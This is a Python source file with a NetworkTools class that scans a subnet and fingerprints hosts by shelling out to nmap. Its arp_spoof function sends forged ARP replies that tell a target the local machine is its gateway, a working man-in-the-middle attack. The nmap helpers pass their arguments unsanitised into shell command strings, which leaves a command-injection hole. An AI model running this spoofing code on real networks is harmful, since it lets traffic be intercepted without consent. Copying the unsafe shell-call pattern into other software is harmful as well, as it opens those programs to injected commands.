import asyncio
import subprocess
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp


class NetworkTools:
    @staticmethod
    async def scan_network(ip_range="192.168.0.1/24"):
        # Using nmap for host discovery
        cmd = f"nmap -sn {ip_range}"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        lines = stdout.decode().splitlines()
        hosts = [line.split()[4] for line in lines if "Nmap scan report for" in line]
        return hosts

    @staticmethod
    async def retrieve_info(target_ip):
        cmd = f"nmap -O -sV {target_ip}"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        output = stdout.decode()
        return output

    @staticmethod
    def arp_spoof(target_ip, gateway_ip):
        try:
            arp_request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            answered_list = srp(arp_request / broadcast, timeout=1, verbose=0)[0]

            if not answered_list:
                print(f"No ARP response received for IP: {target_ip}. ARP spoofing aborted.")
                return

            target_mac = answered_list[0][1].hwsrc
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            send(arp_response, verbose=0)
            print(f"ARP spoofing: {target_ip} thinks we are {gateway_ip}")
        except Exception as e:
            print(f"Error during ARP spoofing: {e}")
